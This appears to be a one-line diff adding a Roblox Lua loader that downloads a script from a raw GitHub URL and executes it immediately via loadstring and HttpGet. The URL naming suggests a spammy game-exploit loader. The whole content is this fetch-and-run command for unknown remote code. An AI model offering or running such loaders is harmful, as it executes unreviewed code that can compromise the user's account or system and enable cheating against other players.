@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/omega-obby-727-stages-spam3-wfcrs6gdo1t8jb.lua"))()
